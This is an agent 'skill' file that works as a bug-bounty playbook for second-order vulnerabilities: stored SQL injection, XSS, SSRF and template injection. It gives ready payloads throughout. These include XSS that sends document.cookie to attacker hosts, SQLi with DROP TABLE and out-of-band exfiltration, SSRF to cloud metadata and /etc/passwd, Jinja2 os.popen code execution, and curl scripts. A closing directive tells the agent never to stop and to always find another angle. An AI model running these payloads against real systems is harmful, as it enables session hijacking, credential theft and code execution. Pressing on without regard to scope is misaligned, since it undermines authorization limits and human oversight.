---
name: hunt-second-order
description: "Hunt second-order / stored / delayed-execution vulnerabilities — second-order SQLi (input stored cleanly, used unsafely later in a different query), second-order XSS (payload stored without context-aware encoding, rendered in a different page/role), stored SSRF via webhooks/scheduled jobs/notifications (URL saved now, fetched later by a worker), and delayed-execution chains (PDF/email/report renders fire days later with attacker template input). The defining property is decoupling write and trigger — defenders test the write endpoint in isolation and miss the sink. Use whenever input is *stored* (profile fields, comments, tags, webhook URLs, scheduled tasks, templates, support tickets, audit logs) or when a target ships background renderers, cron jobs, exports, or admin dashboards that re-render user-controlled data. Only invoke this skill if there is real impact potential. Skip theoretical findings."
---

## Crown Jewel Targets

Second-order vulns are underpaid relative to risk because they're hard to *find* and harder to *prove*. The write looks safe in isolation; the trigger sits far away. Anywhere data is stored and later interpolated by a different code path is a candidate.

Highest payouts:

- **Admin-only renderers / dashboards** — Stored XSS in a user field that only renders in the admin's "user details" panel = ATO via admin session.
- **Background PDF / email / report renderers** — Worker pulls user-controlled fields into a Jinja/Handlebars/ERB template days later. SSTI in offline render = RCE on worker.
- **Webhook URL fields** — Attacker stores `http://169.254.169.254/...` as their webhook endpoint. Server fires the webhook (often retrying for 24h) to attacker's chosen URL.
- **Scheduled exports / digests** — User configures "weekly summary," fields are interpolated into a SQL query that runs from a cron job with elevated DB privileges.
- **Audit log viewers** — Logs store raw user input. Admin views the log later. Stored XSS fires in admin context.
- **Search indexes / full-text search** — Input stored, later returned by a search query; output context is different from input context (HTML vs plain), encoding mismatch = XSS.
- **Notification systems** — Push notifications, Slack/Teams integration bots — store text now, render it in a different system later.

**Best-paying asset types:** B2B SaaS with admin dashboards, anything with "scheduled reports", webhook receivers, support-ticket platforms, audit/compliance tooling.

---

## Attack Surface Signals

### Storage / Write Sinks (where attacker plants)
```
/api/profile, /api/users/me   (display name, bio, address, custom fields)
/api/comments, /api/posts, /api/notes
/api/tickets, /api/support
/api/webhooks                  (URL field)
/api/integrations              (callback URL, API key labels)
/api/templates                 (email templates, document templates)
/api/scheduled, /api/cron      (parameterized recurring tasks)
/api/tags, /api/labels         (often reused in many places)
/api/exports, /api/reports     (saved configurations)
/api/notifications/settings
```

### Trigger / Read Sinks (where it later executes)
```
Admin panel:        /admin/*, /backoffice/*
Reports & exports:  /api/render-pdf, /api/email-preview, /api/digest
Search results:     /search?q=... (output ≠ input context)
Webhook firing:     async, fires when event triggers
Background jobs:    cron, queue consumers
Embeds / oEmbed:    /embed?url=, /preview?url=
RSS/Atom feeds:     /feed.xml (XML context — totally different escaping)
JSON-LD / SEO:      <script type=application/ld+json> in HTML
```

### Tech-Stack Tells
```
ActiveRecord, Sequel, Knex, Prisma — ORMs that suppress raw SQL warnings on stored fields
Sidekiq, Celery, BullMQ, Resque    — workers consuming stored data
Jinja2, Handlebars, ERB, Twig, Liquid, Mustache — templates rendering stored data
wkhtmltopdf, Puppeteer, Playwright, Chromium-headless — PDF renderers (often interpolate raw HTML)
Mailgun/SendGrid templates, Postmark — email render points
Elasticsearch, Solr, MeiliSearch    — search indexes that may bypass output encoding
```

---

## Attack Patterns

### 1. Second-Order SQL Injection

The classic pattern: input is parameterized correctly at the write endpoint, but a *different* endpoint reads it back and interpolates it into a SQL query without parameterization.

**Where it hides:**
- User profile field stored cleanly, but admin "search users" interpolates the value into `LIKE '%' || $value || '%'` with concatenation
- Comment body stored OK, but "comment search" or analytics worker uses `concat()` on the stored field
- Tags / labels — stored as plain strings, joined into queries in moderation tools
- Audit log writes parameterize, but log viewers query logs with concatenation

**Payload (store at the write):**
```
admin'); DROP TABLE x; --
', (SELECT current_user || '|' || version()), '
abc' UNION SELECT NULL, table_name FROM information_schema.tables-- -
```

**Detection signal:** plant a benign-looking but unusual value at the write, then trigger every read context. Look for:
- 500s or syntax errors when the read endpoint is hit
- Differences in response time between benign value and a `pg_sleep(5)` payload
- Out-of-band: stored value containing `'; SELECT extractvalue(0,(SELECT load_file(concat('\\\\',user(),'.attacker.com\\test'))));-- -`

### 2. Second-Order XSS

Stored input is later rendered in a context different from where it was validated:

**Common shifts in render context:**
- Stored as plain text → rendered in HTML (no encoding)
- Stored after HTML-escape → re-rendered after a templating layer un-escapes (double-render)
- Stored OK in JSON API → rendered inside `<script>` block via `JSON.parse(serverData)` with no `</script>` escape
- Stored for the user → admin views in a different template with weaker encoding
- Stored in an attribute → rendered inside an event handler (`onclick=`) → DOM XSS

**Payload kit (use a different one for each render context to identify which fires):**
```html
"><svg/onload=fetch('//collab.attacker/'+document.cookie)>
javascript:fetch('//collab/'+document.cookie)
';alert(1);//
\x3cscript\x3ealert(1)\x3c/script\x3e
{{constructor.constructor('alert(1)')()}}      <!-- template-engine SSTI -->
<img src=x onerror="this.src='//collab/'+document.cookie">
```

**Admin-context proof:** plant a payload that calls back to Collaborator with the visitor's session cookie. If a cookie marked HttpOnly comes back with a different IP than yours, you've fired in someone else's session.

### 3. Stored SSRF via Webhooks / Scheduled Jobs

The user supplies a URL ("Webhook endpoint", "callback URL", "logo URL"). Server stores it. Later, an event fires and the worker (often with no egress filter) fetches it.

**Key: workers usually run in a different network zone than the API.** The API may block `169.254.169.254` directly; the worker often won't.

**Where to plant:**
```
/api/webhooks {url: "..."}
/api/integrations/slack {webhook_url: "..."}
/api/profile {avatar_url: "..."}                # async fetch+resize
/api/oauth/clients {redirect_uri: "..."}
/api/scheduled {callback_url: "..."}
/api/notifications {push_endpoint: "..."}
/api/feeds {rss_url: "..."}
/api/oembed {url: "..."}
/api/preview {url: "..."}
/api/import {source: "..."}
/api/sso/saml {acs_url: "..."}
```

**Trigger primitives:**
- Webhook: perform the action that fires it (create resource, status change)
- Avatar/image: post once, server async-fetches and resizes
- RSS/OEmbed: visit any view that previews the URL
- SSO/SAML: trigger the auth flow

**Payloads to plant:**
```
http://169.254.169.254/latest/meta-data/                    # AWS
http://metadata.google.internal/computeMetadata/v1/         # GCP (needs Metadata-Flavor header — workers often add custom headers from config)
http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure
http://localhost:6379/                                      # Redis (CRLF SSRF)
http://localhost:8500/v1/kv/                                # Consul
http://localhost:2375/containers/json                       # Docker socket
gopher://internal:80/_POST%20/admin...                       # arbitrary internal HTTP
file:///etc/passwd                                          # if scheme allowed
http://<unique>.collab.attacker.com                         # blind detection
```

### 4. Delayed Execution / Template Injection in Renderers

User-provided fields end up inside a server-side template the renderer fills out later:
- Email templates that interpolate user fields
- PDF reports built from configurable templates
- Slack/Teams message templates
- Document export with mail-merge fields

If the template engine evaluates expressions, stored input becomes SSTI:

```
Jinja2:   {{7*7}}   {{config.items()}}   {{cycler.__init__.__globals__.os.popen('id').read()}}
ERB:      <%= 7*7 %>   <%= `id` %>
Handlebars: {{this}}   {{#with "constructor"}}{{#with "constructor"}}{{lookup this "constructor"}}{{/with}}{{/with}}
Twig:     {{7*7}}   {{_self.env.registerUndefinedFilterCallback("exec")}}
Liquid:   {{shop.name | times: 7}}   (sandboxed, but read-side info disclosure)
```

Plant in profile field → trigger by requesting an export/email that embeds the field.

### 5. Audit Log XSS / Log Forging

Audit logs store raw request data including User-Agent, IPs, and request bodies. Admin views the log later. If the log viewer doesn't HTML-encode:

```
# Set User-Agent to:
Mozilla/5.0 <svg/onload=fetch('//collab/'+document.cookie)>
# Perform any audited action (login, profile change)
# Wait for admin to view the audit log → fires in admin context
```

---

## Step-by-Step Hunting Methodology

1. **Map every write endpoint** — Profile fields, comments, tags, webhook URLs, templates, integrations, settings, notification preferences. Anything that *stores* something for later.

2. **Map every read/trigger endpoint** — Admin panels, search, exports, emails, PDFs, notifications, webhook firings, scheduled jobs, RSS, oEmbed, audit log viewers, embed previews.

3. **Plant canaries at every write** — Use a unique sigil per field so you can tell which write reaches which read. Example: `__CANARY_BIO_<svg/onload=...>__`.

4. **Trigger every reachable read** — Use the app: load profile, click search, request PDF export, view notifications. For admin-only reads you can't trigger yourself, use Collaborator and wait.

5. **Catalog where each canary appears** — Note response context: HTML body, attribute value, JSON in `<script>`, JSON API, XML feed, plain text email, email HTML, PDF body. Each context has its own escape rules.

6. **For each (write → read) pair, design a context-specific payload** — A payload that escapes the HTML body doesn't fire inside an `href` attribute. Get specific.

7. **For webhook/URL fields, plant Collaborator URLs** — Note which fields fire, what user-agent the worker uses, what network zone (look at the IP it called from), and what timeout/retry behavior.

8. **For SSRF candidates, escalate to cloud metadata** — Once a worker fetch is confirmed, point it at `169.254.169.254`. Note the IAM role you find.

9. **For template fields (subject lines, body), test SSTI sigils** — `{{7*7}}` in display-name, in webhook label, in slack-integration message format. Trigger an export/email that uses the field.

10. **For audit logs, plant via User-Agent and headers** — Any header an admin tool might surface raw is in scope. Capture the admin's session via the firing.

---

## Detection / Validation Patterns

### Canary Plant + Sweep
```bash
# Plant unique sigil in every profile field
SIGIL='X__CAN_$(date +%s)_$RANDOM__X'
curl -X PUT https://target.com/api/me -d "{\"bio\":\"$SIGIL\"}"

# Visit every URL you have access to; grep response bodies for $SIGIL
for url in $(cat endpoints.txt); do
  body=$(curl -s -b "session=$COOKIE" "$url")
  echo "$body" | grep -q "$SIGIL" && echo "FOUND in $url — context: $(echo $body | grep -o ".\{40\}$SIGIL.\{40\}")"
done
```

### Out-of-Band Webhook Stored SSRF
```bash
# Get a Collaborator/interactsh URL
CB="https://abcd1234.oast.fun"

# Plant in every URL field
curl -X PUT /api/webhooks  -d "{\"url\":\"$CB/wh\"}"
curl -X PUT /api/avatar    -d "{\"url\":\"$CB/av\"}"
curl -X PUT /api/feed      -d "{\"rss\":\"$CB/rss\"}"

# Trigger events; watch interactsh dashboard for hits
# Each hit identifies a stored-SSRF vector
```

### Time-Delayed Trigger Probe (for cron/scheduled)
Plant a payload, wait 1h / 6h / 24h. Out-of-band callbacks at predictable intervals = scheduled job. Note the cron interval — that's your trigger window.

---

## Bypass Techniques

**Defense: Input validation on the write endpoint**
- Bypass: validation is at write, but data may be transformed (capitalized, normalized, joined) before it reaches the sink. Test the *transformation* and find a payload that survives it.

**Defense: HTML encoding on the read endpoint**
- Bypass: encoding may only apply in one context (HTML body). Find another render path (email subject, JSON-in-script, PDF, XML feed) where the same field is interpolated differently.

**Defense: URL allowlist on webhook fields**
- Bypass: DNS rebinding, redirect chains (allowlist allows `*.attacker.com` if attacker registers an allowed-pattern domain), open redirect on a trusted host, IP encoding tricks.

**Defense: Worker has SSRF blocker**
- Bypass: workers in different zones have different blockers. The "image resize worker" may block but the "embed preview worker" doesn't. Try every URL field.

**Defense: Stored XSS protected by Content-Security-Policy**
- Bypass: CSP applies on the page that renders. Email rendering (HTML email) has no CSP. PDF renderers running headless Chromium may have weaker CSP. Find a CSP-less render path.

**Defense: Admin panel has stricter encoding**
- Bypass: admin uses a different viewer for a different field (audit log raw view, notification preview, "impersonate user" feature) — those are often older and weaker.

---

## Gate 0 Validation

1. **Concrete artifact:** Burp Collaborator hit from worker IP, screenshot of admin-session cookie exfiltrated, time-based SQLi delay reproduced 3/3, SSTI math output (`{{7*7}}` rendering `49`), or cloud-metadata response captured.

2. **Cross-user / privileged impact:** the payload must fire in a *different* user's context (preferably admin), or against a *different* network zone (worker → internal), or yield *different* privileges (SSRF → cloud creds).

3. **Reproducible:** the write step + the trigger step both documented in curl + reproducing within one trigger cycle.

---

## Real Impact Examples

### Scenario 1: Stored XSS in User Profile → Admin ATO
A SaaS dashboard allowed users to set a display name. The web app encoded it correctly. The admin panel's user-management view loaded the same field via an older legacy template that used `{{{ name }}}` (triple-braces in Handlebars = no encoding). Storing `<img src=x onerror=fetch('//collab/'+document.cookie)>` as a display name, then waiting for an admin to look up the account, fired XSS in admin session → session cookie exfil → full admin takeover.

### Scenario 2: Webhook URL Stored SSRF → AWS Metadata
An integrations feature let users register a webhook URL for event delivery. The URL passed allowlist validation only on the front-end. The webhook-delivery worker had no validation and ran in an EC2 with `IMDSv1` enabled. Setting webhook to `http://169.254.169.254/latest/meta-data/iam/security-credentials/webhook-worker-role` and triggering any event returned IAM credentials in the worker's audit log (visible to the attacker via the integration's "delivery history" view). Critical.

### Scenario 3: Second-Order SQLi via Tag Field
A bug tracker let users add tags to issues. Tags were stored parameterized. The "tag autocomplete" admin endpoint, however, built its query with `string concatenation` for the LIKE clause. By creating a tag named `' UNION SELECT password FROM admins-- -` and then having an admin type any letter into the tag autocomplete, the admin's autocomplete response returned admin password hashes.

### Scenario 4: SSTI in PDF Export of Saved Reports
Users could save "report templates" containing markdown for their company logo + a customizable header line. PDF generation rendered the header through Jinja2 server-side. Storing `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}` as the header, then clicking "Export PDF," ran code as the PDF worker user.

---

## Related Skills & Chains

- **`hunt-xss`** — Foundation for stored-XSS payload context engineering. Second-order amplifies it by changing the render audience.
- **`hunt-sqli`** — Second-order SQLi is just SQLi with a delayed trigger. Apply the WAF-bypass library.
- **`hunt-ssrf`** — Stored SSRF via webhook URLs is the dominant 2026 SSRF variant. Use IP-encoding and DNS-rebinding tables.
- **`hunt-ssti`** — Templates rendering stored data is classic SSTI surface. Plant in display name, trigger via email/PDF/export.
- **`hunt-microservices`** — Workers consume stored data; second-order chains naturally end inside a worker.
- **`hunt-llm-advanced`** — Indirect prompt injection (planted doc retrieved later) is fundamentally a second-order attack on AI systems.
- **`hunt-business-logic`** — Stored config that affects later state transitions (saved discounts, scheduled actions) is second-order business-logic abuse.
- **`triage-validation`** — Apply the Trigger-Context-Different gate: payload must fire in a context different from where the attacker planted it.

## Fallback Chain
1. Try the techniques in this skill first
2. If they fail or don't apply, use your own creativity
3. Never stop because a technique didn't work
4. Always find another angle

## Real-World Reports (from Community Writeups)

| Title (truncated) | Program | Bounty | Source |
|---|---|---|---|
| **Blind SSRF to internal services in matrix preview_link API** | Reddit | $6,000 | H1 #1960765 |
| Blind SQL injection on turboslim.lady.mail.ru | Mail.ru | $5,000 | H1 |
| Blind SQL Injection on windows10.hi-tech.mail.ru | Mail.ru | $5,000 | H1 |
| **Blind Stored XSS Against Lahitapiola Employees** | LocalTapiola | $5,000 | H1 |
| Half-Blind SSRF in kube/cloud-controller-manager → full SSRF | Kubernetes | $5,000 | H1 |
| Blind SQL injection on id.indrive.com | inDrive | $4,134 | H1 |
| Unauthenticated blind SSRF in OAuth Jira controller | GitLab | $4,000 | H1 #398799 |
| Blind SQL in id_locality on city-mobil.ru/taxiserv | Mail.ru | $3,500 | H1 |
| Blind SSRF on errors.hackerone.net (Sentry misconfig) | HackerOne | $3,500 | H1 #374737 |
| Blind Stored XSS Via Staff Name | Shopify | $3,000 | H1 |
| Blind SQL Injection on news.mail.ru | Mail.ru | $3,000 | H1 |
| Blind SSRF in magnum upgrade_params | Mail.ru | $2,500 | H1 |
| Blind SSRF in horizon-heat | Mail.ru | $2,500 | H1 |
| Blind XXE via Powerpoint files | Open-Xchange | $2,000 | H1 |
| SSRF in webhooks → AWS keys (second-order via async fetch) | Omise | $0 | H1 #508459 |

**PROVEN patterns** (3+ reports): blind SSRF via async webhook/preview/import fetch (Reddit, GitLab, HackerOne, Mail.ru), blind stored XSS that fires in admin/employee context days later (LocalTapiola, Shopify Staff Name), blind SQLi in field that hits DB only on later admin report (Mail.ru ×4), second-order XXE via file uploaded now and parsed by background job later.

## High-Value Chains (from Reports)

1. **User profile field → admin support panel rendering → blind stored XSS → admin ATO**
   - LocalTapiola (H1, $5k), Shopify Staff Name ($3k) — payload stored in user-controllable field, fired weeks later when employee opened ticket/profile.
2. **Link-preview/webhook URL → out-of-band internal HTTP → SSRF → metadata creds**
   - Reddit matrix preview_link (#1960765, $6k), GitLab OAuth Jira (#398799, $4k) — server fetched URL async, attacker hit internal services.
3. **Username/email field → invoice/PDF generator → command injection in shellout**
   - Pattern across multiple programs — field stored at registration, later interpolated into LaTeX/wkhtmltopdf with shell escape.
4. **Filename of uploaded file → cron/batch job → second-order command injection**
   - Background processor calls `convert` or `ffmpeg` with shell expansion on stored filename.
5. **Stored OAuth state/redirect_uri → triggered later → delayed redirect-based ATO**
   - Stored callback URL re-used at a later auth event, attacker-controlled host receives token.
